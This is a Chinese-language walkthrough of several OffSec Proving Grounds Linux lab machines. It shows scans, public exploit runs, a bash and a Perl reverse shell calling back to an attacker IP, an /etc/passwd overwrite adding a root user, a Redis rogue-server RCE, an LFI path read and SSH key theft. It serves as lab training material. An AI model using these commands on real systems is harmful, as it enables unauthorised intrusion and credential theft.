# PG_linux_WriteUp

本文按照：https://docs.google.com/spreadsheets/u/0/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview?pli=1#   循序进行刷题

| 平台 | 题目        | 是否完成 |
| ---- | ----------- | -------- |
| PG   | Twiggy      | √        |
| PG   | Exfiltrated | √        |
| PG   | Pelican     | √        |
| PG   | Astronaut   | √        |
| PG   | Blackgate   | √        |
| PG   | Boolean     | √        |
| PG   | Clue        | √        |
| PG   | Cockpit     | √        |
| PG   | Codo        | √        |
| PG   | Crane       | √        |
| PG   | Levram      | √        |
| PG   | Extplorer   | √        |
| PG   | Hub         | √        |
| PG   | Image       | √        |
| PG   | law         | √        |
| PG   | Lavita      | √        |
| PG   | PC          | √        |
| PG   | Fired       | √        |
| PG   | Press       | √        |
| PG   | Scrutiny    | √        |
| PG   | RubyDome    | √        |
| PG   | Zipper      | √        |
| PG   | Flu         | √        |
| PG   | Ochima      | √        |
| PG   | PyLoader    | √        |
| PG   | Plum        | √        |
| PG   | SPX         | √        |
| PG   | Jordak      | √        |
| PG   | BitForge    | √        |
| PG   | Vmdak       | √        |

靶场代理实在太慢了，建议openvpn配置文件添加

```
socks-proxy 172.16.1.1 7890
```

https://gtfobins.github.io/ 提权姿势

## Twiggy

![image-20250214213947670](./PG_linux.assets/image-20250214213947670.png)

PS：PG靶场的V*N真是一坨

信息收集：

```
┌──(root㉿cyborg)-[/home/…/oscp/pg/linux/Twiggy]
└─# nmap -p- -Pn -A -sS -T4 192.168.201.62
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-15 00:19 CST
Nmap scan report for 192.168.246.62
Host is up (0.25s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-title: Home | Mezzanine
|_http-server-header: nginx/1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-title: Site doesn't have a title (application/json).
|_http-open-proxy: Proxy might be redirecting requests
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (97%), MikroTik RouterOS 7.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 3.13 - 4.4 (91%), Linux 3.8 - 3.16 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   400.27 ms 192.168.45.1
2   400.26 ms 192.168.45.254
3   400.30 ms 192.168.251.1
4   400.35 ms 192.168.246.62

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 302.77 seconds
```

开放了80和8000的http，80开放但是无法访问，奇怪了，8000看着像80端口用的接口

最后用了Offsec在线的kali，是能访问的，先这么做吧......

![image-20250215110211438](./PG_linux.assets/image-20250215110211438.png)

可以看到，跟nmap扫描结果肯定是对的上的Mezzanine，在网上找到一个RCE漏洞`Saltstack 3000.1 - Remote Code Execution`

```
python3 exploit.py --master 192.168.52.62
```

![image-20250215111100251](./PG_linux.assets/image-20250215111100251.png)

执行成功了，破机器，脚本一直报错，但是功能还能用，眼花缭乱了

```
python3 exploit.py --master 192.168.52.62 --exec "sh -i >& /dev/tcp/192.168.49.52/9001 0>&1"
```

![image-20250215112117636](./PG_linux.assets/image-20250215112117636.png)

反弹shell失败，翻了下github，这个东西还能读文件/上传文件，读一下/etc/passwd

```
python3 exploit.py --master 192.168.52.62 -r /etc/passwd 
```

![image-20250215112225613](./PG_linux.assets/image-20250215112225613.png)

把passwd文件复制下来，新加一个用户再传上去连接试试，首先使用openssl生成hash

> tips：passwd提权思路(https://blog.csdn.net/tomyyyyyy/article/details/115714221)

```
perl -le 'print crypt("密码", "盐")'
perl -le 'print crypt("toor", "abc123")'
```

![image-20250215115137393](./PG_linux.assets/image-20250215115137393.png)

```
插入passwd文件后面
echo "root123:abhKo2urtNdfg:0:0:root:/root:/bin/bash" >> passwd
覆盖原本的passwd文件
python3 exploit.py --master 192.168.52.62 --upload-src ./passwd --upload-dest ../../../../../etc/passwd
检查一下
python3 exploit.py --master 192.168.52.62 -r /etc/passwd
```

然后通过ssh成功连接服务器，root权限，拿到proof

![image-20250215120050012](./PG_linux.assets/image-20250215120050012.png)



## Exfiltrated

信息收集：

```
┌──(root㉿cyborg)-[/home/…/oscp/pg/linux/Twiggy]
└─# nmap -p- -Pn -A -sS -T4 192.168.246.163
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-15 12:19 CST
Warning: 192.168.246.163 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.246.163
Host is up (0.24s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   249.00 ms 192.168.45.1
2   237.69 ms 192.168.45.254
3   237.73 ms 192.168.251.1
4   237.85 ms 192.168.246.163

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 995.76 seconds
```

只有80的http服务，访问会跳转到http://exfiltrated.offsec/ ，nmap还扫到了robots.txt文件

![image-20250215123823086](./PG_linux.assets/image-20250215123823086.png)

把这几个都翻了翻，panel进去有东西，根据index页面找到指纹：Subrion CMS v4.2.1

![image-20250215124013604](./PG_linux.assets/image-20250215124013604.png)

找到一个能getshell的文件上传

```
searchsploit Subrion 4.2.1
```

![image-20250215124108462](./PG_linux.assets/image-20250215124108462.png)

提取出来exp

```
searchsploit -m 49876.py
```

网上先看了一下相关复现文章，使用admin/admin登录系统

![image-20250215214902029](./PG_linux.assets/image-20250215214902029.png)

```
python3 49876.py -u http://192.168.164.163/panel/ -l admin -p admin
```



成功getshell

![image-20250215215054476](./PG_linux.assets/image-20250215215054476.png)

尝试suid提权

```
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```

没找到可使用的命令，看了下题目描述跟计划任务有关，查看当前的计划任务

```
cat /etc/contab
```



![image-20250215220925413](./PG_linux.assets/image-20250215220925413.png)

使用root身份执行了/opt/image-exif.sh文件，去看看，无写入权限

![image-20250215221012025](./PG_linux.assets/image-20250215221012025.png)

> 这个脚本执行的是提取`/var/www/html/subrion/uploads`目录下所有`.jpg`文件的EXIF元数据，并将其保存到`/opt/metadata`目录下的日志文件中

忘记了，先生成一个交互式shell

```
反弹shell
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.45.222:9001");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
交互式shell
python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm-256color
```

![image-20250215222054407](./PG_linux.assets/image-20250215222054407.png)

通过搜索关键词exiftool(sh脚本中用的)和shell，找到一个漏洞CVE-2021-22204：https://github.com/convisolabs/CVE-2021-22204-exiftool

需要把脚本的EXP的IP和PORT改成自己的（千万不要删除克隆下来的image.jpg

![image-20250215224305300](./PG_linux.assets/image-20250215224305300.png)

然后把目录下面的image.jpg上传到upload目录下，监听9001，等一会就收到shell了

![image-20250215224416173](./PG_linux.assets/image-20250215224416173.png)

![image-20250216124131259](./PG_linux.assets/image-20250216124131259.png)

拿到proof和local



## Pelican

信息收集：

```
┌──(root㉿cyborg)-[/home/…/oscp/pg/linux/Pelican]
└─# nmap -p- -Pn -A -sS -T4 192.168.164.98 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-15 22:49 CST
Warning: 192.168.164.98 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.164.98
Host is up (0.27s latency).
Not shown: 65441 closed tcp ports (reset), 85 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
|_http-server-header: CUPS/2.2 IPP/2.1
|_http-title: Forbidden - CUPS v2.2.10
| http-methods: 
|_  Potentially risky methods: PUT
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
8080/tcp  open  http        Jetty 1.0
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(1.0)
8081/tcp  open  http        nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://192.168.164.98:8080/exhibitor/v1/ui/index.html
39605/tcp open  java-rmi    Java RMI
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2025-02-15T10:12:18-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h39m59s, deviation: 2h53m14s, median: -2s
| smb2-time: 
|   date: 2025-02-15T15:12:18
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   266.79 ms 192.168.45.1
2   266.73 ms 192.168.45.254
3   266.91 ms 192.168.251.1
4   267.28 ms 192.168.164.98

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1394.41 seconds
```

一眼就找到了exhibitor，搜索一下相关exp

```
searchsploit exhibitor 
```

![image-20250216103916515](./PG_linux.assets/image-20250216103916515.png)

有一个java框架的RCE，CVE-2019-5029，直接拿EXP反弹shell

![image-20250216104727569](./PG_linux.assets/image-20250216104727569.png)

交互式shell

```
python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm-256color
```

![image-20250216104821872](./PG_linux.assets/image-20250216104821872.png)

拿到lcoal

![image-20250216123023204](./PG_linux.assets/image-20250216123023204.png)

先看suid提权

```
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```

有sudo

![image-20250216110205008](./PG_linux.assets/image-20250216110205008.png)

```
sudo -l
```

![image-20250216110538397](./PG_linux.assets/image-20250216110538397.png)

> `charles` 可以在没有密码的情况下（`NOPASSWD`）执行 `/usr/bin/gcore` 命令。

可以用gcore：https://gtfobins.github.io/gtfobins/gcore/

> `gcore` 允许你生成一个进程的 core dump 文件。通常，生成 core dump 文件的权限需要较高的权限（如 root）。然而，由于 `charles` 可以无密码执行 `gcore`，这意味着 `charles` 可以生成任何进程的 core dump 文件。

使用

```
ps -aux | grep root
```

![image-20250216111450136](./PG_linux.assets/image-20250216111450136.png)

找到一个含有password的进程，猜测有戏，dump下来看下

![image-20250216111559527](./PG_linux.assets/image-20250216111559527.png)

cat出来的跟shi一样，用strings来看

![image-20250216111805148](./PG_linux.assets/image-20250216111805148.png)

果真找到了（其实我一开始没看出来下面这个是密码。

输入密码切换用户即可

![image-20250216111908482](./PG_linux.assets/image-20250216111908482.png)

拿到proof

![image-20250216112008326](./PG_linux.assets/image-20250216112008326.png)



## Astronaut

信息收集：

```
root@kali:~# nmap -p- -Pn -A -sS -T4 192.168.164.12
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-16 14:58 CST
Nmap scan report for 192.168.164.12
Host is up (0.0030s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Index of /
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=2/16%OT=22%CT=1%CU=40030%PV=Y%DS=4%DC=T%G=Y%TM=67B18CB
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=104%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST1
OS:1NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT     ADDRESS
1   3.30 ms 192.168.45.1
2   3.29 ms 192.168.45.254
3   3.39 ms 192.168.251.1
4   3.51 ms 192.168.164.12

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.06 seconds
```

开放了80的http端口，很大可能是入口点，是一个index of页面

![image-20250216150018977](./PG_linux.assets/image-20250216150018977.png)

点进去看下，根据页面推测是Grav有关的漏洞

![image-20250216150112921](./PG_linux.assets/image-20250216150112921.png)

粗略的搜了一下，确定是一个CMS（其实网页也能看出来

![image-20250216150209841](./PG_linux.assets/image-20250216150209841.png)

翻了下没找到版本号信息，一般这种都有后台，直接试一下/admin目录

![image-20250216150300496](./PG_linux.assets/image-20250216150300496.png)

回头看能getshell的exp，SSTI需要登录，试了常规密码都没进去，那大概率是`Arbitrary YAML Write/Update (Unauthenticated)`，我用的exp是：https://github.com/CsEnox/CVE-2021-21425.git

因为searchsploit出来的那个，开始一直反弹不了shell，换了这个发现也不行，把V*N断了重新连接了一下才正常收到shell

![image-20250216155839450](./PG_linux.assets/image-20250216155839450.png)

查看suid权限

```
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```

![image-20250216160239106](./PG_linux.assets/image-20250216160239106.png)

一眼顶针，php7.4

```
php -r "pcntl_exec('/bin/sh', ['-p']);"
```

![image-20250216161047802](./PG_linux.assets/image-20250216161047802.png)

拿到proof

![image-20250216161140816](./PG_linux.assets/image-20250216161140816.png)



## Blackgate

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.164.176
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-16 16:13 CST
Nmap scan report for 192.168.164.176
Host is up (0.0030s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
6379/tcp open  redis   Redis key-value store 4.0.14
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=2/16%OT=22%CT=1%CU=30045%PV=Y%DS=4%DC=T%G=Y%TM=67B19E4
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST1
OS:1NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT     ADDRESS
1   2.60 ms 192.168.45.1
2   2.60 ms 192.168.45.254
3   3.29 ms 192.168.251.1
4   3.43 ms 192.168.164.176

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.47 seconds
```

除了ssh只开放了6379，不用说，这就是入口，盲猜一手redis未授权，检测一下

```
redis-cli -h 192.168.164.176
```

![image-20250216161719758](./PG_linux.assets/image-20250216161719758.png)

那这个网上文章就太多了，这次用计划任务来弹shell失败了，应该是没权限导致的

![image-20250216162336135](./PG_linux.assets/image-20250216162336135.png)

想到还开放了22的ssh，但是用公钥getshell也失败了那就只剩一个了：`Redis 小于5.0.5 主从复制 RCE`

https://github.com/n0b0dyCN/redis-rogue-server

我不知道编译exp.so是不是必须的，反正我编译了，第一遍怎么都打不通，可能是因为我用某工具链接进来点了个`清理痕迹`

```
python3 redis-rogue-server.py --rhost 192.168.164.176 --lhost 192.168.45.222 --exp=exp.so
```

![image-20250216171920015](./PG_linux.assets/image-20250216171920015.png)

拿到local

![image-20250216172049055](./PG_linux.assets/image-20250216172049055.png)

用户目录下还有个notes，打开看看

![image-20250216172419321](./PG_linux.assets/image-20250216172419321.png)

这里说redis未开启保护模式，没啥提示，`sodu -l`看下

![image-20250216172651668](./PG_linux.assets/image-20250216172651668.png)

redis-status搜不到提权方式，上传linpeas.sh并执行看看，找到了一些

![image-20250216213921318](./PG_linux.assets/image-20250216213921318.png)

利用`CVE-2021-4034`漏洞试试提权，github搜索相关编号，靶机刚好有git，很方便，按照文档提权即可

![image-20250216214433317](./PG_linux.assets/image-20250216214433317.png)

拿到proof

![image-20250216214544334](./PG_linux.assets/image-20250216214544334.png)



## Boolean

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.164.231
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-16 21:48 CST
Nmap scan report for 192.168.164.231
Host is up (0.0028s latency).
Not shown: 65531 filtered ports
PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)
|   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)
|_  256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)
80/tcp    open   http
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|_    Content-Length: 0
| http-title: Boolean
|_Requested resource was http://192.168.164.231/login
3000/tcp  closed ppp
33017/tcp open   http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Development
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.80%I=7%D=2/16%Time=67B1ED04%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,55,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/html;
SF:\x20charset=UTF-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,55,"H
SF:TTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/html;\x20charset=
SF:UTF-8\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,1C,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\n\r\n")%r(X11Probe,1C,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\n\r\n")%r(FourOhFourRequest,55,"HTTP/1\.0\x20403\x20Forbid
SF:den\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\
SF:x200\r\n\r\n")%r(GenericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:n\r\n")%r(RPCCheck,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(D
SF:NSVersionBindReqTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(
SF:DNSStatusRequestTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(
SF:Help,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SSLSessionReq,1
SF:C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TerminalServerCookie,
SF:1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TLSSessionReq,1C,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Kerberos,1C,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\n\r\n")%r(SMBProgNeg,1C,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\n\r\n")%r(LPDString,1C,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\n\r\n")%r(LDAPSearchReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:\r\n")%r(LDAPBindReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r
SF:(SIPOptions,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(LANDesk-
SF:RC,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TerminalServer,1C
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(NCP,1C,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\n\r\n")%r(NotesRPC,1C,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\n\r\n")%r(JavaRMI,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:n\r\n")%r(WMSRequest,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r
SF:(oracle-tns,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(ms-sql-s
SF:,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(afp,1C,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\n\r\n")%r(giop,1C,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\n\r\n");
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Ubiquiti AirOS 5.5.9 (90%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (89%), Linux 2.6.32 - 3.13 (89%), Linux 2.6.32 - 3.1 (89%), Infomir MAG-250 set-top box (89%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (89%), Linux 3.7 (89%), Netgear RAIDiator 4.2.21 (Linux 2.6.37) (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3000/tcp)
HOP RTT     ADDRESS
1   2.36 ms 192.168.45.1
2   2.38 ms 192.168.45.254
3   2.73 ms 192.168.251.1
4   2.77 ms 192.168.164.231

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.39 seconds
```

80跳转到了http://192.168.164.231/login，访问一下

![image-20250216215632715](./PG_linux.assets/image-20250216215632715.png)

可以注册账号进去，对80和33017都试用dirsearch进行了目录扫描，没啥收获，去看下题目描述（PG靶场的题目描述就跟hints一样

> 本实验专注于通过多种枚举技术识别目标系统中的潜在漏洞，采用特定的网络枚举方法揭示敏感信息和配置错误。此外，还展示了提升权限的方法，以便访问系统的受限区域或功能。

那继续用刚刚的admin123/admin123登录系统，系统中只有一个功能点，就是更改邮箱

![image-20250216223245056](./PG_linux.assets/image-20250216223245056.png)

打开burpsuite进行抓包分析

![image-20250216223801441](./PG_linux.assets/image-20250216223801441.png)

confirmed翻译为：已确认，状态为false（刚开始没发现是输在英语上了，不认识这个词......

bp重放器添加`&user%5Bconfirmed%5D=True`

![image-20250216224230465](./PG_linux.assets/image-20250216224230465.png)

实现了越权，回到浏览器页面刷新，成了文件上传页面

![image-20250216224307774](./PG_linux.assets/image-20250216224307774.png)

测试上传一个txt，点击一下上传的发现直接下载了，文件名作为参数传递给file

![image-20250216224443473](./PG_linux.assets/image-20250216224443473.png)

尝试了一下LFI不行，还有个cwk参数，直接问一下万能GPT

![image-20250216224938347](./PG_linux.assets/image-20250216224938347.png)

原来如此，下面连接成功实现LFI

```
http://192.168.164.231/?cwd=../../../../../../../../etc&file=&download=true
```

![image-20250216225043879](./PG_linux.assets/image-20250216225043879.png)

直接拿local发现权限不够，用户目录下有.ssh文件

![image-20250216225321174](./PG_linux.assets/image-20250216225321174.png)

 known_hosts下载下来看了下，应该是ssh公钥

![image-20250216225621583](./PG_linux.assets/image-20250216225621583.png)

keys有四个私钥文件，随便下了俩看了下是一样的

![image-20250216225652361](./PG_linux.assets/image-20250216225652361.png)

尝试ssh私钥登录（MD试了半天都不对，想起来能上传文件来着......

![image-20250216230435551](./PG_linux.assets/image-20250216230435551.png)

